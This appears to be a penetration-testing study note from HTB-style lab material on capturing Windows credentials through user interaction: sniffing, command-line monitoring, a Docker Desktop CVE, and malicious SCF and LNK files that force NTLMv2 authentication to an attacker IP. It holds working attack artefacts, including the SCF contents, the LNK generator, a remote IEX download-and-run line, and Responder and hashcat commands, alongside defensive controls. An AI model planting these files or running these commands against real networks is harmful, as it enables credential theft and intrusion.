## Overview

Users are often the weakest link in an organization.

After local privilege escalation checks have been exhausted, credential capture techniques that rely on user behavior may provide another path forward.

Useful user-interaction opportunities include:

- sniffing local network traffic
- capturing cleartext credentials
- monitoring process command lines
- abusing vulnerable applications that require user interaction
- planting files on heavily used shares
- capturing NTLMv2 hashes through SMB authentication
- cracking captured hashes offline

> [!important]
> These techniques rely on user behavior and can be noisy. Use only when authorized by the rules of engagement.

---

# Method 1 – Traffic Capture

## Why Traffic Capture Matters

If packet capture tools or drivers are installed, an unprivileged user may be able to capture traffic from the local system.

A useful example is Wireshark with Npcap.

Npcap includes an installer option:

```text
Restrict driver's access to Administrators only
```

This option is not enabled by default in some setups, which may allow non-admin users to capture traffic.

---

# What to Look For

Captured traffic may expose:

- cleartext FTP credentials
- HTTP basic authentication
- legacy application credentials
- NTLM challenge-response material
- service authentication attempts
- internal hostnames
- usernames
- network paths
- protocols useful for lateral movement

Example cleartext FTP indicators:

```text
USER root
PASS FTP_adm1n!
```

---

# Local Capture Workflow

1. Check whether Wireshark or packet capture tooling is installed.
2. Confirm whether packet capture is allowed for the current user.
3. Start capture on an active interface.
4. Filter for interesting protocols.
5. Watch for cleartext authentication or hashes.
6. Save evidence and stop capture.

Useful display filters:

```text
ftp
http
smb
ntlmssp
ldap
kerberos
```

---

# Attack-Box Capture Workflow

If positioned on an attack machine inside the environment, run passive capture tools for a period of time.

Useful tools:

- Wireshark
- tcpdump
- net-creds

`net-creds` can extract passwords and hashes from:

- a live interface
- a packet capture file

> [!tip]
> Passive capture can be useful during an assessment while other enumeration continues, but confirm passive monitoring is in scope.

---

# Method 2 – Process Command Line Monitoring

## Why Command Lines Matter

Scheduled tasks, scripts, backup jobs, deployment tools, and admin commands may pass credentials directly on the command line.

Examples:

```text
net use
runas
wevtutil
sqlcmd
psexec
robocopy
backup scripts
database clients
```

If the process runs briefly, normal process listing may miss it. A polling script can catch short-lived command lines.

---

# Process Command Line Monitor Script

This PowerShell loop captures process command lines, waits briefly, captures them again, and prints differences.

```powershell
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## How It Works

1. Takes a snapshot of running process command lines.
2. Sleeps for one second.
3. Takes a second snapshot.
4. Compares both snapshots.
5. Prints new or changed command lines.

---

# Run Monitor Script from Attack Host

Host the script on the attack machine and execute it in memory on the target.

```powershell
IEX (iwr 'http://10.10.10.205/procmon.ps1')
```

Example output:

```powershell
PS C:\htb> IEX (iwr 'http://10.10.10.205/procmon.ps1')

InputObject                                           SideIndicator
-----------                                           -------------
@{CommandLine=C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}} =>
@{CommandLine=“C:\Windows\system32\cmd.exe” }                          =>
@{CommandLine=\??\C:\Windows\system32\conhost.exe 0x4}                      =>
@{CommandLine=net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd}       =>
@{CommandLine=“C:\Windows\system32\backgroundTaskHost.exe” -ServerName:CortanaUI.AppXy7vb4pc2... <=
```

Captured credential:

```text
User: inlanefreight\sqlsvc
Password: My4dm1nP@s5w0Rd
Target: \\sql02\backups
```

Possible follow-up:

- access `SQL02`
- inspect the `backups` share
- search backups for database credentials
- test whether `sqlsvc` has reuse or elevated rights

---

# Method 3 – Vulnerable Services Requiring User Interaction

## Attack Concept

Some local privilege escalation paths require an application restart or a user action.

These issues may not trigger immediately, but they can be useful during longer assessments.

Example:

```text
CVE-2019-15752
```

Affected software:

```text
Docker Desktop Community Edition before 2.1.0.1
```

---

# CVE-2019-15752 – Docker Desktop Example

## Vulnerable Behavior

When affected Docker Desktop versions start, they search for helper files such as:

```text
docker-credential-wincred.exe
docker-credential-wincred.bat
```

Expected search directory:

```text
C:\PROGRAMDATA\DockerDesktop\version-bin\
```

This directory was misconfigured to allow:

```text
BUILTIN\Users: Full Write
```

Any authenticated user could write a file into the directory.

---

# Exploitation Conditions

A payload placed in the vulnerable directory may execute when:

1. Docker starts.
2. A user runs:

```text
docker login
```

This can lead to privilege escalation depending on the user or service context.

> [!note]
> This technique may require waiting for a user action or service restart. It is useful during longer assessments but does not guarantee immediate elevation.

---

# Docker Desktop Triage

Check installed applications:

```cmd
wmic product get name,version
```

Check the vulnerable directory:

```cmd
icacls "C:\ProgramData\DockerDesktop\version-bin"
```

Look for broad write access such as:

```text
BUILTIN\Users:(F)
```

Search for missing helper binaries or hijackable files:

```cmd
dir "C:\ProgramData\DockerDesktop\version-bin"
```

---

# Method 4 – SCF File Hash Capture on File Shares

## Attack Concept

A Shell Command File, or `SCF`, can be configured with an icon path pointing to a UNC path.

When Windows Explorer browses the folder containing the `.scf` file, it attempts to retrieve the icon.

If the icon path points to an attacker-controlled SMB server, the victim host may authenticate automatically, sending an NTLMv2 challenge-response.

This can be captured with tools such as:

- Responder
- Inveigh
- InveighZero

The captured NetNTLMv2 hash can then be cracked offline.

---

# When SCF Capture Is Useful

This technique is useful when:

- write access exists to a heavily used share
- users frequently browse the folder
- a target user has weak or crackable password
- outbound SMB from victim to attacker is allowed
- NTLM authentication is enabled
- the host version still triggers SCF icon authentication behavior

> [!warning]
> This is a user-interaction technique. It may affect multiple users who browse the directory.

---

# Malicious SCF File

Create a file named to appear near the top of a directory listing.

Example filename:

```text
@Inventory.scf
```

The `@` prefix helps the file appear near the top of the folder.

Example contents:

```text
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

Replace:

```text
10.10.14.3
```

with the attacker-controlled interface IP.

The share and icon file do not need to be real for the authentication attempt to occur.

---

# Start Responder

Start Responder on the attacker interface.

```bash
sudo responder -wrf -v -I tun0
```

Example output:

```text
Swordfish4051@htb[/htb]$ sudo responder -wrf -v -I tun0

NBT-NS, LLMNR & MDNS Responder 3.0.2.0

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.129.43.30
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...
```

Captured user:

```text
WINLPE-SRV01\Administrator
```

Captured material:

```text
NetNTLMv2 hash
```

> [!note]
> In the lab example, the user may browse the share a few minutes after Responder starts.

---

# Crack NetNTLMv2 Hash with Hashcat

Use Hashcat mode `5600`.

```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

Example cracked result:

```text
ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...:Welcome1
```

Recovered password:

```text
Welcome1
```

---

# SCF Attack Flow

1. Find writable, heavily used share.
2. Create malicious `.scf` file.
3. Point `IconFile` to attacker SMB listener.
4. Start Responder, Inveigh, or InveighZero.
5. Wait for user to browse the folder.
6. Capture NetNTLMv2 hash.
7. Crack offline.
8. Validate recovered credential within scope.
9. Remove planted file.

---

# Method 5 – Malicious LNK File Hash Capture

## Why LNK Matters

SCF-based capture does not work reliably on newer systems such as Server 2019.

A malicious `.lnk` file can achieve a similar SMB authentication trigger.

The `.lnk` target or icon path points to an attacker-controlled UNC path.

When the folder is browsed, Windows may attempt to resolve the remote icon or target and authenticate to the attacker SMB server.

---

# Generate Malicious LNK with PowerShell

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

Replace:

```text
<attackerIP>
```

with the attacker-controlled IP address.

Example:

```text
\\10.10.14.3\@pwn.png
```

---

# LNK Attack Flow

1. Generate the `.lnk` file.
2. Place it in a writable share or user-accessible directory.
3. Start Responder, Inveigh, or InveighZero.
4. Wait for the folder to be browsed.
5. Capture NetNTLMv2 hash.
6. Crack offline or relay only if explicitly in scope.
7. Remove the `.lnk` file.

---

# Practical Decision Tree

## Are passive capture tools available?

Check for:

- Wireshark
- Npcap
- tcpdump
- net-creds

If available and in scope, capture traffic and inspect for cleartext credentials or hashes.

---

## Are command lines exposing credentials?

Run a process command-line monitor.

Look for commands containing:

```text
/user:
-password
/pass
/p:
net use
sqlcmd
wevtutil
robocopy
```

---

## Are vulnerable user-interaction services installed?

Enumerate installed software:

```cmd
wmic product get name,version
```

Check for known vulnerable versions, such as old Docker Desktop.

---

## Is there write access to a busy share?

If yes, consider hash capture with:

- `.scf` file on older systems
- `.lnk` file on newer systems

Use filenames that blend into the directory.

---

## Can captured hashes be cracked?

Use:

```bash
hashcat -m 5600 <hashfile> <wordlist>
```

If cracked, test credentials only within scope.

---

# Troubleshooting

## No traffic appears in Wireshark

Possible causes:

- Npcap access restricted to administrators
- wrong interface selected
- traffic is switched or not visible
- capture filter too strict
- target protocols are encrypted
- no relevant traffic occurred

---

## Process monitor misses credentials

Possible causes:

- polling interval too slow
- process exits too quickly
- WMI permissions issue
- command did not run during monitoring
- credentials passed through environment variables or files instead

Try reducing sleep interval carefully, but avoid excessive system impact.

---

## Responder captures nothing

Possible causes:

- user has not browsed the share
- outbound SMB blocked
- Windows does not resolve remote icon
- SMB signing or NTLM restrictions
- wrong interface selected
- firewall blocks inbound SMB
- SCF technique unsupported on target OS
- share path not reachable

---

## Hash does not crack

Possible causes:

- strong password
- wrong Hashcat mode
- malformed hash
- insufficient wordlist/rules
- machine account hash
- account uses long random password

---

## SCF does not trigger on Server 2019

Use malicious `.lnk` technique instead.

---

# Command Reference

## Process command-line monitor

```powershell
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Execute hosted monitor script

```powershell
IEX (iwr 'http://10.10.10.205/procmon.ps1')
```

## Docker Desktop software enumeration

```cmd
wmic product get name,version
```

## Check Docker version-bin ACL

```cmd
icacls "C:\ProgramData\DockerDesktop\version-bin"
```

## Malicious SCF contents

```text
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

## Start Responder

```bash
sudo responder -wrf -v -I tun0
```

## Crack NetNTLMv2 hash

```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

## Generate malicious LNK

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

---

# Cleanup Checklist

Remove planted files:

```text
@Inventory.scf
legit.lnk
any staged payloads
```

Stop capture tools:

```text
Responder
Inveigh
InveighZero
Wireshark
tcpdump
net-creds
```

Remove temporary scripts:

```text
procmon.ps1
monitor output files
captured pcap files from target
```

Handle captured credentials carefully:

- store only in approved assessment evidence
- do not leave hashes on target systems
- document capture source and timestamp
- validate only within scope
- recommend password rotation for affected accounts

---

# Defensive Notes

## Risks

User-interaction credential capture works because normal Windows behavior can automatically authenticate to remote paths.

Risk factors include:

- NTLM enabled
- outbound SMB allowed
- writable shared folders
- weak passwords
- lack of SMB egress filtering
- users browsing untrusted shares
- command-line credential usage
- packet capture tools accessible to non-admins
- vulnerable applications waiting for user actions

---

# Defensive Controls

Organizations should:

- restrict Npcap/Wireshark capture access to administrators
- avoid cleartext protocols such as FTP
- prevent credentials on command lines
- monitor process command lines for secrets
- block outbound SMB to untrusted networks
- disable or restrict NTLM where possible
- enforce strong passwords to resist offline cracking
- monitor shares for `.scf` and suspicious `.lnk` files
- restrict write access to common shares
- monitor Responder/Inveigh-like network behavior
- patch vulnerable applications such as old Docker Desktop
- apply least privilege to shared folders

---

# Key Takeaways

- Traffic capture can reveal cleartext credentials or hashes if capture is allowed.
- Process command-line monitoring can catch short-lived commands that expose credentials.
- Vulnerable services may require user interaction or application restart to trigger payloads.
- Old Docker Desktop versions were vulnerable due to writable helper binary search paths.
- SCF files can trigger SMB authentication when a user browses a folder.
- Malicious `.lnk` files can replace SCF techniques on newer Windows systems.
- Responder can capture NetNTLMv2 hashes from forced SMB authentication.
- NetNTLMv2 hashes can be cracked offline with Hashcat mode `5600`.
- These techniques are noisy and should be cleaned up immediately after use.

---

# Related Notes

- [[Windows Privilege Escalation]]
- [[Credential Hunting]]
- [[User Interaction Attacks]]
- [[Traffic Capture]]
- [[Wireshark]]
- [[Npcap]]
- [[Process Command Line Monitoring]]
- [[Responder]]
- [[Inveigh]]
- [[SCF Files]]
- [[LNK Files]]
- [[NetNTLMv2]]
- [[Hashcat]]
- [[Docker Desktop]]
- [[SMB]]

---

# Tags

#windows
#privilege-escalation
#credential-hunting
#user-interaction
#traffic-capture
#wireshark
#npcap
#process-monitoring
#scf
#lnk
#responder
#netntlmv2
#hashcat
#smb
#pentesting